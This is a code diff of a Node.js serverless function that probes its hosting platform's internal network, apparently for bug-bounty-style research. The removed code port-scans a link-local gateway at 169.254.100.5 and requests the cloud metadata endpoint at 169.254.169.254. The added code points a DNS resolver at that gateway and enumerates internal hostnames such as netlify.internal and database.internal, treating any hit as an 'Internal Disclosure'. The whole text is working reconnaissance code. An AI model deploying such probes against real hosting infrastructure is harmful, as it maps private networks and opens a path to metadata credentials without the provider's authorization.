@@ -1,48 +1,45 @@
-const http = require('http');
-const net = require('net');
+const dns = require('dns').promises;
 
 exports.handler = async (event, context) => {
-  const impact = {};
-  const targetIp = '169.254.100.5';
+  const dnsResearch = {};
+  
+  const resolver = new dns.Resolver();
+  resolver.setServers(['169.254.100.5']);
 
-  // 1. Port Scanning
-  const checkPort = (port) => new Promise((resolve) => {
-    const socket = new net.Socket();
-    socket.setTimeout(500);
-    socket.on('connect', () => { socket.destroy(); resolve(true); });
-    socket.on('timeout', () => { socket.destroy(); resolve(false); });
-    socket.on('error', () => { socket.destroy(); resolve(false); });
-    socket.connect(port, targetIp);
-  });
+  const targets = [
+    'compute.internal',
+    'us-east-2.compute.internal',
+    'netlify.internal',
+    'internal.netlify.app',
+    'database.internal'
+  ];
 
-  // Scan port: 53 (DNS), 80 (HTTP), 8080 (Proxy), 9001 (Lambda Runtime)
-  const portsToScan = [53, 80, 8080, 9001];
-  impact.open_ports = {};
-  for (const port of portsToScan) {
-    impact.open_ports[port] = await checkPort(port);
+  dnsResearch.discovery = {};
+
+  for (const host of targets) {
+    try {
+      const addresses = await resolver.resolve4(host);
+      dnsResearch.discovery[host] = addresses;
+    } catch (e) {
+      dnsResearch.discovery[host] = `Error: ${e.code}`;
+    }
   }
 
-  // 2. DNS Poisoning / Spoofing Test
-  const dns = require('dns').promises;
   try {
-    impact.dns_internal_query = await dns.resolve('netlify-internal.com');
-  } catch (e) { impact.dns_internal_query = e.message; }
+    dnsResearch.reverse_gateway = await resolver.reverse('169.254.100.5');
+  } catch (e) {
+    dnsResearch.reverse_gateway = `Error: ${e.code}`;
+  }
 
-  // 3. SSRF Cloud Metadata (Alternative Path)
-  const checkMetadataWithHeader = () => new Promise((resolve) => {
-    const options = {
-      hostname: '169.254.169.254',
-      path: '/latest/meta-data/',
-      headers: { 'Metadata-Flavor': 'Google' },
-      timeout: 1000
-    };
-    http.get(options, (res) => resolve(`Found with Header! Status: ${res.statusCode}`))
-        .on('error', (e) => resolve(`Failed: ${e.message}`));
-  });
-  impact.metadata_v2_test = await checkMetadataWithHeader();
+  console.log('--- DNS DEEP DIVE LOG ---');
+  console.log(JSON.stringify(dnsResearch, null, 2));
 
   return {
     statusCode: 200,
-    body: JSON.stringify({ message: "Impact Search", data: impact }, null, 2)
+    body: JSON.stringify({
+      message: "DNS Internal Discovery",
+      results: dnsResearch,
+      note: "If any target returns an IP instead of ENOTFOUND, it's a valid Internal Disclosure."
+    }, null, 2)
   };
 };
